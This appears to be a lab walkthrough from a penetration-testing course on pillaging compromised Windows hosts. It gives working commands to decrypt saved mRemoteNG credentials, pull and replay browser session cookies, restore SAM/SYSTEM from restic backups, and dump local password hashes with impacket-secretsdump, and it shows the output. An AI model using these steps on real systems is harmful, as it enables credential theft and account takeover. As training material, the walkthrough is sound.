
Pillaging is the process of obtaining information from a compromised system. It can be personal information, corporate blueprints, credit card data, server information, infrastructure and network details, passwords, or other types of credentials, and anything relevant to the company or security assessment we are working on.

These data points may help gain further access to the network or complete goals defined during the pre-engagement process of the penetration test. This data can be stored in various applications, services, and device types, which may require specific tools for us to extract.


## Data Sources

Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients


Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?


Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace?


```
Get-ChildItem -Path "C:\Users\Peter\AppData\Roaming\mRemoteNG\" -ErrorAction SilentlyContinue


PS C:\Users\Peter> type C:\Users\Peter\AppData\Roaming\mRemoteNG\confCons.xml


clone this repo to attack machine, gh repo clone 0xSatoruX/SEC-NOTES


python3 mremoteng_decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" -p "mR3m"


```


Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag.

copy the cookies.sqllite to attack machine and run this cmd

```
python3 cookieextractor.py --dbpath "cookies.sqlite" --host slack --cookie d
(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
```



now open firefox and login to slack add the cookie using cookie editor or using dev tools

now you will be able to see the flag and also you will get the password for user jeff.

**Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer.**


rdp to jeff using the password, we will be able to find a password for the restic in the desktop in a file.

 **Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.**


list the snapshots.

```
restic.exe -r E:\restic2\ snapshots
```

now restore the config file using the snapshot id.

you should also create a folder in the C/E drive for restoring the config file

```
restic.exe -r E:\restic2\ restore b2f5caa0 --target E:\restore
```

after restoring use the file explorer to navigate to the restored folder and copy the SAM and SYSTEM file to the attacker machine.

```
└─$ impacket-secretsdump -sam SAM -system SYSTEM local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x9828e7264dd454a4cae19b10e003858e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:**********
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2525a827e7ca4bb2504d25a70e4d1292:::
jeff:1004:aad3b435b51404eeaad3b435b51404ee:91b2e2ed6cd72ed531635c1b58eabe19:::
Grace:1005:aad3b435b51404eeaad3b435b51404ee:2abc09f151d5e95fb8805e265268e6c3:::
Peter:1006:aad3b435b51404eeaad3b435b51404ee:8160b16dddc064509c4ccf530c7dfaa0:::
[*] Cleaning up... 

```

run the above cmd in the attacker machine to get the administrator hash 